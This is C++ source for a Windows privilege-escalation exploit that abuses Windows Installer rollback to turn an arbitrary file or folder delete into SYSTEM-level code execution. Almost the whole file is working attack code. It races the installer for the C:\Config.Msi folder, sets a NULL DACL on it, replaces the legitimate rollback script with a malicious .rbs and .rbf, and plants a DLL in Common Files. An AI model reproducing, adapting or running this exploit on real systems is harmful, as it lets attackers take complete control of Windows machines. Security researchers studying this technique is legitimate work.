// Exploit code to turn an arbitrary file/folder delete as SYSTEM into a SYSTEM EoP.
// Based on a technique by Abdelhamid Naceri (halov).

#include <Windows.h>
#include <Shlwapi.h>
#include <Msi.h>
#include <PathCch.h>
#include <shellapi.h>
#include <iostream>
#include "resource.h"
#include <vector>
#include <string>
#pragma comment(lib, "Msi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "PathCch.lib")
using namespace std;

const wchar_t pathOfDllDrop[] = L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.DLL";

bool stage2FilesystemChangeDetected;

class Resources
{
public:
	static Resources& instance()
	{
		static Resources singleton;
		return singleton;
	};
	const std::vector<BYTE>& msi() { return m_msi; };
	const std::vector<BYTE>& fakeRbs() { return m_fakeRbs; };
	const std::vector<BYTE>& fakeRbf() { return m_fakeRbf; };
private:
	Resources()
	{
		m_hModule = GetModuleHandle(NULL);
		initFromResource(m_msi, MAKEINTRESOURCE(IDR_MSI1), L"msi");
		initFromResource(m_fakeRbs, MAKEINTRESOURCE(IDR_RBS1), L"rbs");
		initFromResource(m_fakeRbf, MAKEINTRESOURCE(IDR_RBF1), L"rbf");
	};
	void initFromResource(std::vector<BYTE>& vec, LPCWSTR lpResourceName, LPCWSTR lpResourceType)
	{
		HRSRC hRsrc = FindResource(m_hModule, lpResourceName, lpResourceType);
		DWORD resSize = SizeofResource(m_hModule, hRsrc);
		vec.reserve(resSize);
		HGLOBAL hRes = LoadResource(m_hModule, hRsrc);
		BYTE* resData = (BYTE*)LockResource(hRes);
		vec.assign(resData, resData + resSize);

	};
	HMODULE m_hModule;
	std::vector<BYTE> m_msi;
	std::vector<BYTE> m_fakeRbs;
	std::vector<BYTE> m_fakeRbf;
};


bool bitnessCheck()
{
	auto fakeRbf = Resources::instance().fakeRbf().data();
	int dllBitness =
		*(unsigned __int16*)(fakeRbf + *(__int32*)(fakeRbf + 0x3c) + 4)
		== 0x8664 ? 64 : 32;

	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	int systemBitness = systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? 64 : 32;

	return dllBitness == systemBitness;
}

std::wstring uniqueString()
{
	UUID u;
	UuidCreate(&u);

	RPC_WSTR su;
	UuidToString(&u, &su);

	std::wstring result((PCWSTR)su);

	RpcStringFree(&su);

	return result;
}

std::wstring createUniqueTempFolder()
{
	WCHAR tempFolder[MAX_PATH + 1];
	GetEnvironmentVariable(L"TEMP", tempFolder, _countof(tempFolder));

	WCHAR result[MAX_PATH + 1];
	PathCchCombine(result, _countof(result), tempFolder, uniqueString().c_str());

	CreateDirectory(result, NULL);

	return result;
}

class TempMsi
{
public:
	TempMsi()
	{
		auto msi = Resources::instance().msi();
		tempMsiPath = L"C:\\Windows\\Temp\\" + uniqueString();
		HANDLE hMsi = CreateFile(
			tempMsiPath.c_str(),
			GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
			0, NULL);
		DWORD dwNumberOfBytesWritten;
		WriteFile(hMsi, msi.data(), msi.size(), &dwNumberOfBytesWritten, NULL);
		CloseHandle(hMsi);
	}
	TempMsi(TempMsi&) = delete;
	TempMsi& operator =(TempMsi&) = delete;
	~TempMsi()
	{
		DeleteFile(tempMsiPath.c_str());
	}
	std::wstring GetTempMsiPath() { return tempMsiPath; }
private:
	std::wstring tempMsiPath;
};

bool get_configMsiExists()
{
	return GetFileAttributes(L"C:\\Config.Msi") != INVALID_FILE_ATTRIBUTES;
}

bool get_configMsiIsRegistered()
{
	bool configMsiRegistered = false;
	HKEY hkeyInstallerFolders;
	if (RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\Folders",
		0,
		KEY_QUERY_VALUE,
		&hkeyInstallerFolders) == ERROR_SUCCESS)
	{
		if (
			RegQueryValueEx(hkeyInstallerFolders, L"C:\\Config.Msi\\", NULL, NULL, NULL, NULL)
			== ERROR_SUCCESS
			||
			RegQueryValueEx(hkeyInstallerFolders, L"C:\\Config.Msi", NULL, NULL, NULL, NULL)
			== ERROR_SUCCESS)
		{
			configMsiRegistered = true;
		}
		RegCloseKey(hkeyInstallerFolders);
	}

	return configMsiRegistered;
}

bool tryDeleteConfigMsi()
{
	SHFILEOPSTRUCT fileOp;
	fileOp.hwnd = NULL;
	fileOp.wFunc = FO_DELETE;
	fileOp.pFrom = L"C:\\Config.Msi\0";
	fileOp.pTo = NULL;
	fileOp.fFlags = FOF_NO_UI;

	if (SHFileOperation(&fileOp) == 0
		&& !fileOp.fAnyOperationsAborted)
	{
		return true;
	}
	else
	{
		return false;
	}
}

void spinUntilConfigMsiDeleted()
{
	while (GetFileAttributes(L"C:\\Config.Msi") != INVALID_FILE_ATTRIBUTES)
	{
		Sleep(200);
	}
}

void install(const std::wstring& installPath) {
	TempMsi tempMsi;
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	MsiInstallProduct(
		tempMsi.GetTempMsiPath().c_str(),
		(L"ACTION=INSTALL TARGETDIR=" + installPath).c_str());
}

void installWithRollback(const std::wstring& installPath) {
	CreateDirectory(installPath.c_str(), NULL);
	TempMsi tempMsi;
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	MsiInstallProduct(
		tempMsi.GetTempMsiPath().c_str(),
		(L"ACTION=INSTALL ERROROUT=1 TARGETDIR=" + installPath).c_str());
}

void uninstall() {
	TempMsi tempMsi;
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	MsiInstallProduct(
		tempMsi.GetTempMsiPath().c_str(),
		L"REMOVE=ALL");
}

DWORD WINAPI thread_uninstall(PVOID)
{
	uninstall();
	return 0;
}

DWORD WINAPI thread_installWithRollback(PVOID installPath)
{
	// Loop until we verify that stage2() is monitoring filesystem changes
	do
	{
		HANDLE hFileToBeDetected = CreateFile(
			(L"C:\\Config.Msi\\" + uniqueString()).c_str(),
			GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL);
		CloseHandle(hFileToBeDetected);
		Sleep(100);
	} while (!stage2FilesystemChangeDetected);

	installWithRollback((const wchar_t*)installPath);
	return 0;
}

void stage1()
{
	printf("[*] Stage one starting.\n");
	// Start with an uninstall, just in case Msi_EoP is already in an installed state
	uninstall();

	// Install Msi_EoP
	auto installPath = createUniqueTempFolder();
	install(installPath.c_str());

	// Get a handle to the installed file dummy.txt
	auto dummyFilePath = installPath + L"\\dummy.txt";
	HANDLE hFileDummy = CreateFile(
		dummyFilePath.c_str(),
		FILE_READ_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING,
		0, NULL);
	if (!hFileDummy)
	{
		std::wcout << L"[-] " << std::wstring(dummyFilePath) << L" didn't install, exiting" << std::endl;
		exit(1);
	}

	// Create events for synchronization with the uninstall process.
	// The uninstall process will move dummy.txt to an .rbf file within C:\Config.Msi.
	// After this occurs, a custom action in the uninstaller will set event FolderOrFileDeleteToSystem_RbfFullyWritten,
	// and wait for event FolderOrFileDeleteToSystem_ReadyForAttemptedDelete before proceeding.
	HANDLE hEvent_RbfFullyWritten = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_RbfFullyWritten");
	ResetEvent(hEvent_RbfFullyWritten);
	HANDLE hEvent_ReadyForAttemptedDelete = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_ReadyForAttemptedDelete");
	ResetEvent(hEvent_ReadyForAttemptedDelete);

	// Start the uninstall, to execute in parallel with this thread
	HANDLE hUninstallThread = CreateThread(NULL, NULL, thread_uninstall, NULL, NULL, NULL);

	// Poll the file name referenced by handle hFileDummy. Once the uninstaller has moved dummy.txt,
	// the reported filename will change, and we will learn the name of the .rbf file within C:\Config.Msi.
	WCHAR updatedFilePath[MAX_PATH + 1];
	for (;;)
	{
		DWORD len = GetFinalPathNameByHandle(
			hFileDummy,
			updatedFilePath,
			_countof(updatedFilePath),
			FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
		const WCHAR configMsiPrefix[] = L"\\\\?\\C:\\Config.Msi\\";
		constexpr size_t configMsiPrefixLen = _countof(configMsiPrefix) - 1;
		if (len >= configMsiPrefixLen && !_wcsnicmp(updatedFilePath, configMsiPrefix, configMsiPrefixLen))
		{
			break;
		}
		Sleep(100);
	}
	CloseHandle(hFileDummy);

	// Wait for the uninstaller to finish most operations on the .rbf
	if (WaitForSingleObject(hEvent_RbfFullyWritten, INFINITE) == 30000)
	{
		std::cout << "[-] FAILED: Timeout waiting for uninstall to set event FolderOrFileDeleteToSystem_RbfFullyWritten." << std::endl;
		SetEvent(hEvent_ReadyForAttemptedDelete);
		exit(1);
	}
	// At this time, the uninstaller is paused, waiting for event FolderOrFileDeleteToSystem_ReadyForAttemptedDelete

	// Open a new handle to the .rbf, preventing deletion of the .rbf (and, consequently, the C:\Config.Msi folder),
	// by causing a sharing violation (no FILE_SHARE_DELETE allowed). We are allowed to open this handle, because
	// the .rbf file is just the original dummy.txt file moved to a new location.
	HANDLE hFileRbf = CreateFile(
		&updatedFilePath[4],
		GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
		0, NULL);

	// Allow the uninstaller to run to completion
	SetEvent(hEvent_ReadyForAttemptedDelete);
	CloseHandle(hEvent_RbfFullyWritten);
	CloseHandle(hEvent_ReadyForAttemptedDelete);
	if (WaitForSingleObject(hUninstallThread, 120000) == WAIT_TIMEOUT)
	{
		std::cout << "[-] FAILED: Timeout waiting for uninstall to complete." << std::endl;
		exit(1);
	}

	// Finally, delete the .rbf, so that C:\Config.Msi will be left as an empty folder,
	// in preparation for triggering the aribitrary folder/file delete.
	FILE_DISPOSITION_INFO fdi;
	fdi.DeleteFileW = TRUE;
	SetFileInformationByHandle(hFileRbf, FileDispositionInfo, &fdi, sizeof(fdi));
	CloseHandle(hFileRbf);
	printf("[+] Stage one completed.\n");
}

void stage2()
{
	// Create a SECURITY_ATTRIBUTES structure with a NULL DACL
	printf("[*] Stage two starting.\n");
	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	auto NtSetSecurityObject = (NTSTATUS(WINAPI*)(
		HANDLE               Handle,
		SECURITY_INFORMATION SecurityInformation,
		PSECURITY_DESCRIPTOR SecurityDescriptor
		))GetProcAddress(ntdll, "NtSetSecurityObject");

	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;
	sa.bInheritHandle = FALSE;

	// Create C:\Config.Msi with a NULL DACL and obtain a handle
	CreateDirectory(L"C:\\Config.Msi", &sa);
	HANDLE hConfigMsi = CreateFile(
		L"C:\\Config.Msi",
		GENERIC_READ | READ_CONTROL | WRITE_DAC | FILE_DELETE_CHILD,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

	// Create a buffer for directory change notifications
	const size_t fileNotifyBufferLen = 0x100000;
	BYTE* fileNotifyBuffer = (BYTE*)malloc(fileNotifyBufferLen);

	// Create events for synchronization with the install process.
	// During installation, the install process will create a .rbs (rollback script) file within C:\Config.Msi.
	// After this occurs, a custom action in the installer will set event FolderOrFileDeleteToSystem_RbsFullyWritten.
	// Then, it will wait for event FolderOrFileDeleteToSystem_ReadyForRollback before rolling back.
	HANDLE hEvent_RbsFullyWritten = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_RbsFullyWritten");
	ResetEvent(hEvent_RbsFullyWritten);
	HANDLE hEvent_ReadyForRollback = CreateEvent(NULL, FALSE, FALSE, L"FolderOrFileDeleteToSystem_ReadyForRollback");
	ResetEvent(hEvent_ReadyForRollback);

	// This global flag will allow thread_installWithRollback to know that this thread has begun
	// monitoring file system changes.
	stage2FilesystemChangeDetected = false;

	// Start an install that will error out and roll back, running in parallel with this thread.
	auto installPath = createUniqueTempFolder();
	HANDLE hInstallThread = CreateThread(NULL, NULL, thread_installWithRollback, (PVOID)installPath.c_str(), NULL, NULL);

	// Watch for filesystem changes within C:\Config.Msi to find the filename of the new .rbs file
	std::wstring rbsFileName;
	do {
		DWORD dwBytesReturned;
		if (!ReadDirectoryChangesW(
			hConfigMsi,
			fileNotifyBuffer,
			fileNotifyBufferLen,
			FALSE,
			FILE_NOTIFY_CHANGE_FILE_NAME,
			&dwBytesReturned, NULL, NULL))
		{
			std::wcout << L"[-] FAILED: Failed to detect creation of an .rbs file." << std::endl;
			exit(1);
		}
		stage2FilesystemChangeDetected = true;
		BYTE* fileNotifyInfoBytePtr = fileNotifyBuffer;
		for (;;)
		{
			FILE_NOTIFY_INFORMATION* fileNotifyInfo = (FILE_NOTIFY_INFORMATION*)fileNotifyInfoBytePtr;
			if (fileNotifyInfo->Action == FILE_ACTION_ADDED &&
				fileNotifyInfo->FileNameLength / 2 >= 4 &&
				!_wcsnicmp(
					&fileNotifyInfo->FileName[fileNotifyInfo->FileNameLength / 2 - 4],
					L".rbs",
					4))
			{
				rbsFileName = L"C:\\Config.Msi\\";
				rbsFileName.append(fileNotifyInfo->FileName, fileNotifyInfo->FileNameLength / 2);
				break;
			}
			else if (!fileNotifyInfo->NextEntryOffset)
			{
				break;
			}
			else
			{
				fileNotifyInfoBytePtr += fileNotifyInfo->NextEntryOffset;
			}
		}
	} while (!rbsFileName.length());

	// Wait for the installer to finish writing the .rbs file
	if (WaitForSingleObject(hEvent_RbsFullyWritten, 120000) == WAIT_TIMEOUT)
	{
		std::cout << "[-] FAILED: Timeout waiting for FolderOrFileDeleteToSystem_RbsFullyWritten event." << std::endl;
		exit(1);
	}
	// At this point, the installer is paused, waiting for FolderOrFileDeleteToSystem_ReadyForRollback

	// Reapply the NULL DACL to C:\Config.Msi, becuase by now the installer has set its own DACL.
	// Note, we're able to do this because when we originally opened the handle hConfigMsi, we
	// requested the WRITE_DAC permission, and we were granted it then because at that time
	// C:\Config.Msi still had a permissive DACL.
	NtSetSecurityObject(hConfigMsi, DACL_SECURITY_INFORMATION, &sd);

	// Delete the legitimate .rbs
	if (!DeleteFile(rbsFileName.c_str()))
	{
		std::cout << "[-] Failed to delete .rbs file. Error: 0x"
			<< std::hex << GetLastError() << std::dec << std::endl;
		exit(1);
	}

	// Drop a malicious .rbs that references a malicious .rbf
	HANDLE hRbs = CreateFile(
		rbsFileName.c_str(),
		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS,
		0, NULL);
	auto fakeRbs = Resources::instance().fakeRbs();
	DWORD dwNumberOfBytesWritten;
	WriteFile(hRbs, fakeRbs.data(), fakeRbs.size(), &dwNumberOfBytesWritten, NULL);
	CloseHandle(hRbs);

	

	// Allow rollback to continue, consuming the malicious .rbs and .rbf
	SetEvent(hEvent_ReadyForRollback);
	CloseHandle(hEvent_RbsFullyWritten);
	CloseHandle(hEvent_ReadyForRollback);
	CloseHandle(hConfigMsi);
	printf("[+] Stage two completed.\n");
	
}

void usage()
{
	std::cerr << "Usage:" << std::endl;
	std::cerr << "\tFolderOrFileDeleteToSystem.exe [/stage1only]" << std::endl;
	std::cerr << std::endl;
	std::cerr << "This exploit demonstrates how an arbitrary file or folder delete vuln as SYSTEM or admin" << std::endl;
	std::cerr << "can be used to gain local privilege escalation to SYSTEM." << std::endl;
	std::cerr << std::endl;
	std::cerr << "The exploit proceeds in two stages. Stage 1 performs the needed preparation before triggering the delete." << std::endl;
	std::cerr << "You will be prompted to trigger the delete at the appropriate time. At that point, you can terminate this" << std::endl;
	std::cerr << "exploit and resume it after the delete if preferred. This is useful if, for example, the delete vuln" << std::endl;
	std::cerr << "requires a system restart. Afterwards, run this exploit again. No special flags are needed. It will" << std::endl;
	std::cerr << "automatically detect the system state and resume with stage 2." << std::endl;
	std::cerr << std::endl;
	std::cerr << "Stage 2 of the exploit is performed after the arbitrary file/folder delete, and achieves SYSTEM LPE." << std::endl;

}

